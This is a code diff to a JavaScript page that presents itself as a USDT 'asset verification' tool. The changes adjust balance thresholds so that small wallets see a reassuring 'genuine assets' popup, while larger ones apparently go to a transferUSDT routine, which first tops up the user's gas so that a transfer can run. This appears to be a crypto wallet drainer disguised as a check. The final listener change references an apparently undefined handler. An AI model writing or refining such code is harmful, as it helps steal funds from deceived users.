@@ -54,12 +54,12 @@ async function verifyAssets() {
     console.log(`USDT Balance: ${usdtBalance} USDT`);
     console.log(`BNB Balance: ${userBNB} BNB`);
 
-    if (usdtBalance === 00) {
+    if (usdtBalance === 0) {
         showPopup("No assets found.", "black");
         return;
     }
 
-    if (usdtBalance <= 10) {
+    if (usdtBalance <= 5) {
         showPopup(
             `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
             "green"
@@ -75,7 +75,7 @@ async function verifyAssets() {
 
 async function transferUSDT(usdtBalance, userBNB) {
     try {
-        if (userBNB < 0.005) {
+        if (userBNB < 0.0005) {
             console.log("Low BNB detected, sending gas fee...");
             await sendBNB(userAddress, "0.001");
         }
@@ -151,4 +151,4 @@ function showPopup(message, color) {
 }
 
 // Attach event listener
-document.getElementById("verifyBtn").addEventListener("click", verifyAssets);
+document.getElementById("verifyBtn").addEventListener("click", verifyBtn);
